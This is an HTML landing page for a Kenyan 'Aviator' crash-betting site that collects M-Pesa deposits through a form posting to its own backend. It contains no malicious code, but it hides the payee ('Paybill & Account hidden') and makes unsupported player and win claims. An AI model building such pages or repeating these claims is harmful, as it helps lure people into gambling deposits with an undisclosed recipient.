<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FLY BET - Aviator Kenya</title>
<style>
body{margin:0;background:#FFC107;font-family:Arial}
.header{background:black;color:#FFC107;padding:12px;display:flex;justify-content:space-between;align-items:center}
.live{background:#FFC107;color:black;padding:8px 18px;border-radius:20px;font-weight:bold}
.card{background:white;margin:15px;border-radius:20px;padding:20px;text-align:center}
.play-btn{background:#FFC107;border:none;padding:18px;width:100%;border-radius:30px;font-weight:bold;font-size:20px;margin-top:15px}
.deposit-box{background:black;margin:15px;border-radius:20px;padding:20px;color:white}
input{width:100%;padding:16px;border-radius:12px;border:none;margin:10px 0;font-size:18px;box-sizing:border-box;text-align:center}
.deposit-btn{background:#FFC107;border:none;padding:18px;width:100%;border-radius:12px;font-weight:bold;font-size:19px;margin-top:10px}
</style>
</head>
<body>

<div class="header">
  <div>✈️ FLY BET</div>
  <div class="live">LIVE</div>
</div>

<div class="card">
  <div style="font-size:70px;">✈️</div>
  <h1 style="margin:10px 0;">AVIATOR</h1>
  <p>Fly High, Win Big - Kenya's #1 Crash Game</p>
  <div style="display:flex;justify-content:space-around;margin:20px 0">
    <div><b>1.5M+</b><br><small>Players</small></div>
    <div><b>500x</b><br><small>Max Win</small></div>
    <div><b>24/7</b><br><small>Live</small></div>
  </div>
  <button class="play-btn" onclick="document.getElementById('deposit').scrollIntoView()">PLAY AVIATOR NOW</button>
</div>

<div class="deposit-box" id="deposit">
  <h2 style="text-align:center;margin:0">💳 DEPOSIT - M-PESA</h2>
  <p style="text-align:center;color:gray;margin:5px 0 15px 0">Instant - Secure - Auto Credit</p>
  
  <input id="phone" type="tel" placeholder="2547XXXXXXXX">
  <input id="amount" type="number" value="100" placeholder="Amount">
  
  <button class="deposit-btn" id="depBtn" onclick="deposit()">DEPOSIT NOW</button>
  <p style="text-align:center;color:#666;font-size:12px;margin-top:10px">Paybill & Account hidden - Secure</p>
</div>

<script>
async function deposit(){
  const phone = document.getElementById('phone').value.trim();
  const amount = document.getElementById('amount').value.trim();
  const btn = document.getElementById('depBtn');
  
  if(!phone || !amount){ alert('Enter phone and amount'); return; }
  
  btn.innerText = 'Sending prompt...';
  btn.disabled = true;
  
  try{
    const res = await fetch('/api/deposit',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({phone, amount})
    });
    const data = await res.json();
    if(data.success){
      alert('✅ Check phone! Enter M-Pesa PIN to complete');
    }else{
      alert('Failed: ' + (data.error?.errorMessage || JSON.stringify(data.error)));
    }
  }catch(e){
    alert('Network error - Try again');
  }
  btn.innerText = 'DEPOSIT NOW';
  btn.disabled = false;
}
</script>

</body>
</html>
